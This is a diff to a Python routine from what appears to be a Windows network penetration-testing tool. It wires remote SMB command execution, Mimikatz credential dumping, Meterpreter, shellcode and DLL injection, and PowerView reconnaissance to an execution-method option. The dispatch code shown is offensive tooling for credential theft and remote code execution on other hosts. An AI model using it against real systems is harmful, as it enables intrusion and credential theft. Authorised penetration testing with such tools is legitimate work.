@@ -168,29 +168,35 @@ def connect(host):
                 wdigest.disable()
 
             if settings.args.command:
-                EXECUTOR(settings.args.command, host, domain, settings.args.no_output, smb)
+                EXECUTOR(settings.args.command, host, domain, settings.args.no_output, smb, settings.args.execm)
 
             if settings.args.pscommand:
-                EXECUTOR(ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb)
+                EXECUTOR(ps_command(settings.args.pscommand), host, domain, settings.args.no_output, smb, settings.args.execm)
 
             if settings.args.mimikatz:
-                powah_command = PowerSploit(settings.args.server, local_ip)
-                EXECUTOR(powah_command.mimikatz(), host, domain, True, smb)
+                powah_command = PowerShell(settings.args.server, local_ip)
+                EXECUTOR(powah_command.mimikatz(), host, domain, True, smb, settings.args.execm)
 
             if settings.args.mimikatz_cmd:
-                powah_command = PowerSploit(settings.args.server, local_ip)
-                EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb)
+                powah_command = PowerShell(settings.args.server, local_ip)
+                EXECUTOR(powah_command.mimikatz(settings.args.mimikatz_cmd), host, domain, True, smb, settings.args.execm)
+
+            if settings.args.powerview:
+                #For some reason powerview functions only seem to work when using smbexec...
+                #I think we might have a mistery on our hands boys and girls!
+                powah_command = PowerShell(settings.args.server, local_ip)
+                EXECUTOR(powah_command.powerview(settings.args.powerview), host, domain, True, smb, 'smbexec')
 
             if settings.args.inject:
-                powah_command = PowerSploit(settings.args.server, local_ip)
+                powah_command = PowerShell(settings.args.server, local_ip)
                 if settings.args.inject.startswith('met_'):
-                    EXECUTOR(powah_command.inject_meterpreter(), host, domain, True, smb)
+                    EXECUTOR(powah_command.inject_meterpreter(), host, domain, True, smb, settings.args.execm)
 
                 if settings.args.inject == 'shellcode':
-                    EXECUTOR(powah_command.inject_shellcode(), host, domain, True, smb)
+                    EXECUTOR(powah_command.inject_shellcode(), host, domain, True, smb, settings.args.execm)
 
                 if settings.args.inject == 'dll' or settings.args.inject == 'exe':
-                    EXECUTOR(powah_command.inject_exe_dll(), host, domain, True, smb)
+                    EXECUTOR(powah_command.inject_exe_dll(), host, domain, True, smb, settings.args.execm)
         try:
             smb.logoff()
         except:
